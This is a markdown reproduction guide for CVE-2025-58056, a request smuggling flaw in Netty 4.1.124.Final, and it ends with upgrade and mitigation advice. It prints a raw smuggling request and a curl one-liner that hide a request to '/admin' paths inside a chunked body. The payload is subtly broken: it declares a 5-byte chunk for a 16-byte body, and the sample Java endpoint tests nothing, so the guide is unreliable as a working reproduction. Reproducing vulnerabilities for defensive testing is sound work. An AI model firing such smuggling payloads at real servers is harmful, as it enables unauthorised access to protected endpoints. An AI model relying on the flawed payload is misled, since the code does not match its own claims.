# CVE-2025-58056 Reproduction Guide

## Vulnerability Details
- **CVE ID**: CVE-2025-58056
- **Component**: Netty (HTTP request smuggling)
- **Vulnerable Version**: 4.1.124.Final
- **Fixed Version**: 4.1.125.Final
- **Severity**: HIGH

## How to Reproduce

### 1. Create Test Project with Vulnerable Netty

```xml
<!-- Temporarily revert to vulnerable version for testing -->
<dependency>
    <groupId>io.netty</groupId>
    <artifactId>netty-bom</artifactId>
    <version>4.1.124.Final</version>
    <type>pom</type>
    <scope>import</scope>
</dependency>
```

### 2. HTTP Request Smuggling Test

The vulnerability allows HTTP request smuggling by sending malformed chunked transfer encoding:

```http
POST /api/endpoint HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Transfer-Encoding: chunked

5
{"test": "data"}
0

GET /admin/sensitive-data HTTP/1.1
Host: localhost:8080

```

### 3. Expected Behavior

**Vulnerable Version (4.1.124.Final):**
- Netty incorrectly parses the LF-only line terminator
- May process the smuggled request
- Could lead to unauthorized access

**Fixed Version (4.1.125.Final):**
- Netty correctly requires CRLF line terminators
- Rejects malformed requests
- Prevents request smuggling

## Testing Tools

### 1. Manual Testing with curl
```bash
# Test with vulnerable version
curl -X POST http://localhost:8080/api/test \
  -H "Content-Type: application/json" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'5\n{"test": "data"}\n0\n\nGET /admin HTTP/1.1\nHost: localhost:8080\n\n'
```

### 2. Automated Testing with Burp Suite
- Use Burp Suite's HTTP Request Smuggling extension
- Target: Your Spring Boot application
- Look for request smuggling vulnerabilities

### 3. Custom Test Script
```java
// Create a test endpoint that processes chunked requests
@RestController
public class TestController {
    
    @PostMapping("/test-chunked")
    public ResponseEntity<String> testChunked(@RequestBody String body) {
        // This endpoint would be vulnerable to request smuggling
        // if using Netty 4.1.124.Final
        return ResponseEntity.ok("Processed: " + body);
    }
}
```

## Verification Steps

### 1. Check Netty Version
```bash
mvn dependency:tree | grep netty-codec-http
```

### 2. Test Request Processing
- Send malformed chunked requests
- Monitor application logs
- Check for unexpected request processing

### 3. Security Headers
- Ensure proper HTTP parsing
- Verify chunked transfer encoding handling
- Check for request smuggling indicators

## Mitigation

### 1. Update Netty (Recommended)
```xml
<dependency>
    <groupId>io.netty</groupId>
    <artifactId>netty-bom</artifactId>
    <version>4.1.125.Final</version>
    <type>pom</type>
    <scope>import</scope>
</dependency>
```

### 2. Additional Security Measures
- Use reverse proxy with proper HTTP parsing
- Implement request validation
- Monitor for unusual request patterns
- Use security headers

## Notes

- This vulnerability is primarily exploitable in specific configurations
- The impact depends on your application's architecture
- Testing should be done in a controlled environment
- Always test security fixes in staging before production
